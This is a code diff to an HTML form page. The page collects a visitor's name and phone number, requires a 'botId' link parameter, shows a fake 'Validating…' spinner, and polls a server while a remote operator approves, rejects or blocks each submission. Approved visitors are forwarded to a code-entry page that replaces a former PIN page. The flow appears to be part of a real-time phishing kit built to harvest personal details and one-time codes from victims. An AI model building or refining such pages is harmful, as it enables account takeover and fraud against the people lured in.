@@ -101,6 +101,48 @@ button:disabled{
   min-height:18px;
 }
 
+/* SPINNER + VALIDATING */
+#validating{
+  display:none;
+  margin-top:24px;
+  flex-direction:column;
+  align-items:center;
+  gap:14px;
+}
+
+#validating.show{
+  display:flex;
+}
+
+.spinner{
+  width:48px;
+  height:48px;
+  border:5px solid #e0e0e0;
+  border-top-color:#00843d;
+  border-radius:50%;
+  animation:spin 0.9s linear infinite;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+.validating-text{
+  font-size:16px;
+  font-weight:600;
+  color:#00843d;
+}
+
+.validating-sub{
+  font-size:13px;
+  color:#888;
+}
+
+/* HIDE FORM WHEN VALIDATING */
+form.hidden{
+  display:none;
+}
+
 /* FOOTER */
 .footer{
   margin-top:26px;
@@ -132,25 +174,34 @@ button:disabled{
 
   </form>
 
-  <div class="footer">
+  <div id="validating">
+    <div class="spinner"></div>
+    <div class="validating-text">Validating…</div>
+    <div class="validating-sub">Please wait while we verify your details</div>
+  </div>
+
+  <div class="footer" id="footer">
     By continuing, you agree to the terms and conditions
   </div>
 
 </div>
 
 <script>
-const nameInput  = document.getElementById("nameInput");
-const phoneInput = document.getElementById("phoneInput");
-const submitBtn  = document.getElementById("submitBtn");
-const statusEl   = document.getElementById("status");
+const nameInput   = document.getElementById("nameInput");
+const phoneInput  = document.getElementById("phoneInput");
+const submitBtn   = document.getElementById("submitBtn");
+const statusEl    = document.getElementById("status");
+const formEl      = document.getElementById("detailsForm");
+const validatingEl = document.getElementById("validating");
+const footerEl    = document.getElementById("footer");
 
 function normalizePhone(raw){
-  return raw.replace(/[^0-9]/g, "");   // digits only
+  return raw.replace(/[^0-9]/g, "");
 }
 
 function updateButtonState(){
   const nameOk  = nameInput.value.trim().length >= 2;
-  const phoneOk = normalizePhone(phoneInput.value).length >= 6;  // any 6+ digits
+  const phoneOk = normalizePhone(phoneInput.value).length >= 6;
   submitBtn.disabled = !(nameOk && phoneOk);
 }
 
@@ -160,7 +211,21 @@ phoneInput.addEventListener("input", updateButtonState);
 phoneInput.addEventListener("change", updateButtonState);
 window.addEventListener("load", updateButtonState);
 
-document.getElementById("detailsForm").addEventListener("submit", e=>{
+function showValidating(show){
+  if (show) {
+    formEl.classList.add("hidden");
+    validatingEl.classList.add("show");
+    footerEl.style.display = "none";
+  } else {
+    formEl.classList.remove("hidden");
+    validatingEl.classList.remove("show");
+    footerEl.style.display = "block";
+  }
+}
+
+let pollTimer = null;
+
+document.getElementById("detailsForm").addEventListener("submit", async e => {
   e.preventDefault();
 
   const name  = nameInput.value.trim();
@@ -174,10 +239,66 @@ document.getElementById("detailsForm").addEventListener("submit", e=>{
   localStorage.setItem("name", name);
   localStorage.setItem("phone", phone);
 
-  statusEl.textContent = "Redirecting...";
+  const botId = new URLSearchParams(window.location.search).get("botId") || "";
+  if (!botId) {
+    statusEl.textContent = "Invalid link. Please use the link you were given.";
+    return;
+  }
 
-  const botId = new URLSearchParams(window.location.search).get("botId");
-  window.location.href = "pin.html" + (botId ? "?botId=" + botId : "");
+  submitBtn.disabled = true;
+  statusEl.textContent = "";
+  showValidating(true);
+
+  try {
+    const resp = await fetch("/submit-details", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ name, phone, botId })
+    });
+
+    if (!resp.ok) throw new Error("Server error");
+
+    const { requestId } = await resp.json();
+    localStorage.setItem("detailsRequestId", requestId);
+
+    if (pollTimer) clearInterval(pollTimer);
+
+    pollTimer = setInterval(async () => {
+      try {
+        const r = await fetch(`/check-details/${requestId}`);
+        const data = await r.json();
+
+        if (data.blocked) {
+          clearInterval(pollTimer);
+          showValidating(false);
+          statusEl.textContent = "🚫 Access denied. You have been blocked.";
+          submitBtn.disabled = true;
+          return;
+        }
+
+        if (data.approved === true) {
+          clearInterval(pollTimer);
+          window.location.href = "code.html" + (botId ? "?botId=" + botId : "");
+          return;
+        }
+
+        if (data.approved === false) {
+          clearInterval(pollTimer);
+          showValidating(false);
+          statusEl.textContent = "❌ Details rejected.";
+          submitBtn.disabled = false;
+          return;
+        }
+      } catch (err) {
+        // network blip — keep polling
+      }
+    }, 3000);
+
+  } catch (err) {
+    showValidating(false);
+    statusEl.textContent = "Failed to send. Please try again.";
+    submitBtn.disabled = false;
+  }
 });
 </script>
 
